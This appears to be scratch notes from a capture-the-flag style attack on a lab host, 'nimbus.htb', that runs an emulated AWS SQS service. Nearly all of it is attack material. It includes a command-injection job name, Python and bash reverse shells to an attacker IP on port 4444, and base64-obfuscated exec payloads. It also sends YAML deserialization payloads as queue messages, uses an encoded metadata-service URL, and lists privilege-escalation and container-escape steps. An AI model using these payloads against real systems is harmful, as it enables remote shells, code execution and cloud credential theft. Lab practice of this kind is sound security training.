name: test;python3 -c "import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.17.229\",4444));"
schedule: "* * * * *"
runtime: python3.11


python3 -c 

name: aaa
script: "import base64;exec(base64.b64decode('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE3LjIyOSIsNDQ0NCkpOwo=').decode())"

aws --endpoint-url http://aws.nimbus.htb sqs list-queues
{
    "QueueUrls": [
        "http://floci:4566/847219365028/nimbus-jobs"
    ]
}

aws --endpoint-url http://aws.nimbus.htb sqs get-queue-attributes --queue-url http://floci:4566/847219365028/nimbus-jobs --attribute-names All


aws --endpoint-url http://aws.nimbus.htb sqs send-message --queue-url http://floci:4566/847219365028/nimbus-jobs --message-body "test"

aws pentest checklist

http://0251.0376.0251.0376/latest/meta-data/

https://github.com/pop3ret/AWSome-Pentesting/blob/main/AWSome-Pentesting-Cheatsheet.md

cloudfox 

localstack

floci pentest

bash -c "bash -i >& /dev/tcp/10.10.17.229/4444 0>&1"


aws --endpoint-url http://aws.nimbus.htb sqs send-message --queue-url http://floci:4566/847219365028/nimbus-jobs --message-body '!!python/object/apply:os.system ["bash -c \"bash -i >& /dev/tcp/10.10.17.229/4444 0>&1\""]'

aws --endpoint-url http://aws.nimbus.htb sqs send-message --queue-url http://floci:4566/847219365028/nimbus-jobs --message-body "!!python/object/apply:subprocess.Popen\n- !!python/tuple\n  - python\n  - -c\n  - \"\_\_import\_\_(\'os\').system(str(\_\_import\_\_(\'base64\').b64decode(\'YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNy4yMjkvNDQ0NCAwPiYxIg==\').decode()))\""

aws --endpoint-url http://floci:4566 sqs list-queues


# TODO 

this is most important https://github.com/OWASP/owasp-cstg

codebuild privelege escape 
https://github.com/OWASP/owasp-cstg/blob/master/aws/03-privilege-escalation/aws-codebuild-privesc.md

1.  Enum 工具，常见attack surface

2.  AWS codebuild privelege escape

3.  crash handler contrainer escape